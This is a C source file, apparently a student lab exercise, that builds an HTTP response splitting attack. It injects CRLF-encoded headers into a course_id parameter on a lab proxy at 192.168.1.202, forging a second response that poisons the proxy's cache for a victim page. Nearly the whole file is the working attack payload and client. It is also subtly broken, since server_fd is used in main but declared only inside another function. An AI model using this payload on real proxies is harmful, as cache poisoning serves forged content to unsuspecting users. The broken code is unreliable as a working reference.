#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

const uint16_t PROXY_SERVER_PORT = 8080;
char * PROXY_SERVER_IP = "192.168.1.202";
// the request with the URL-encoded payload inserted in the course_id parameter
// /r -> %0D /n -> %0A space -> %20
char * RESPONSE_SPLITTER = "GET /cgi-bin/course_selector?course_id="
    "%0D%0ATransfer-Encoding:%20chunked" // /r/n Transfer-Encoding: chunked
    "%0D%0A%0D%0A" // /r/n/r/n  -> indicates the end of headers and start of body
    "0%0D%0A%0D%0A" // 0/r/n/r/n  -> indicates the end of chuncked content
    "HTTP/1.1%20200%20OK%0D%0A" // HTTP/1.1 200 OK\r\n  -> our fake second response
    "Last-Modified:%20Tus,%2006%20Jan%202026%2013:07:00%20GMT" // Last-Modified: Tus, 06 Jan 2026 13:07:00 GMT
    "%0D%0AContent-Type:%20text/html" // /r/nContent-Type: text/html
    "%0D%0AContent-Length:%2022%0D%0A" // /r/n Content-Length: 22/r/n
    "%0D%0A" // /r/n/r/n
    "<HTML>325000057</HTML>" // -> the malicious page inserted the the proxy's cache
    " HTTP/1.1\r\n" // -> the continue of the first request
    "Host: 192.168.1.202\r\n\r\n"; // -> the end of the first request

char * GET_REQ_VICTIM_PAGE = "GET /67607.html HTTP/1.1\r\n"
                             "Host: 192.168.1.202\r\n\r\n";

// Attacker client that sends the HTTP response splitter
void start_tcp_connection() {
    // create a socket to connect to the proxy server
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in addr; // struct to hold the web server's address
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET; // IPv4 address
    addr.sin_port = htons(PROXY_SERVER_PORT);
    inet_pton(AF_INET, PROXY_SERVER_IP, &addr.sin_addr);

    // connect
    if (connect(server_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        exit(EXIT_FAILURE);
    }

    // socket options as required
    int opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt,
    sizeof(opt)) < 0) {
        printf("setsockopt(SO_REUSEADDR) failed...\n");
        close(server_fd);
        exit(1);
    }
    opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEPORT, &opt,
    sizeof(opt)) < 0) {
        printf("setsockopt(SO_REUSEPORT) failed...\n");
        close(server_fd);
        exit(1);
    }
}

int main () {
    // open TCP connection
    start_tcp_connection();

    // build the HTTP response slitter

    // the last-modified time of the actual /67607.html page
    // Last-Modified: Tus, 06 Jan 2026 13:07:00 GMT
    // calculated last-modified time of our second fake response - one day after the targil was published

    // send the http response slitter to the proxy server
    ssize_t sent = send(server_fd, RESPONSE_SPLITTER, strlen(RESPONSE_SPLITTER), 0);
    if (sent < 0) {
        exit(EXIT_FAILURE);
    }

    // send the http GET for /67607.html
    ssize_t sent2 = send(server_fd, GET_REQ_VICTIM_PAGE, strlen(GET_REQ_VICTIM_PAGE), 0);
    if (sent2 < 0) {
        exit(EXIT_FAILURE);
    }

    // close the socket
    close(server_fd);
}